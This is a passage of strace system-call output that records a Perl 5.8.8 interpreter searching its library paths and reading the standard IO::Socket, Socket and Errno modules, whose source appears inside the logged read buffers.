$me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
8458  07:23:31.498407 _llseek(6, 3425, [3425], SEEK_SET) = 0
8458  07:23:31.498425 _llseek(6, 0, [3425], SEEK_CUR) = 0
8458  07:23:31.498446 close(6)          = 0
8458  07:23:31.498470 stat64("/etc/perl/IO/Socket.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498489 stat64("/etc/perl/IO/Socket.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498502 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498515 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498529 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498542 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498556 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498567 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498580 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498592 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498605 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.498618 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
8458  07:23:31.498639 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.498654 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.498665 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.498682 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
8458  07:23:31.503175 stat64("/etc/perl/Socket.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503269 stat64("/etc/perl/Socket.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503318 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503349 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503376 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503450 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503480 stat64("/usr/lib/perl5/Socket.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503507 stat64("/usr/lib/perl5/Socket.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503520 stat64("/usr/share/perl5/Socket.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503532 stat64("/usr/share/perl5/Socket.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503559 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.503571 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
8458  07:23:31.503592 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.503606 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.503618 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.503636 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
8458  07:23:31.504097 brk(0x8239000)    = 0x8239000
8458  07:23:31.504301 read(8, "", 4096) = 0
8458  07:23:31.504317 close(8)          = 0
8458  07:23:31.504446 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8458  07:23:31.504505 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8458  07:23:31.504532 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
8458  07:23:31.504547 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
8458  07:23:31.504639 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
8458  07:23:31.504658 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d17000
8458  07:23:31.504671 mmap2(0xb7d1c000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d1c000
8458  07:23:31.504687 close(8)          = 0
8458  07:23:31.505287 brk(0x825a000)    = 0x825a000
8458  07:23:31.505539 stat64("/etc/perl/Errno.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505557 stat64("/etc/perl/Errno.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505571 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505584 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505597 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505610 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505624 stat64("/usr/lib/perl5/Errno.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505636 stat64("/usr/lib/perl5/Errno.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505649 stat64("/usr/share/perl5/Errno.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505661 stat64("/usr/share/perl5/Errno.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505673 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.505686 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
8458  07:23:31.505707 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.505721 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.505732 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.505752 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
8458  07:23:31.506593 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
8458  07:23:31.507124 _llseek(8, 5966, [5966], SEEK_SET) = 0
8458  07:23:31.507142 _llseek(8, 0, [5966], SEEK_CUR) = 0
8458  07:23:31.507152 close(8)          = 0
8458  07:23:31.507577 brk(0x827b000)    = 0x827b000
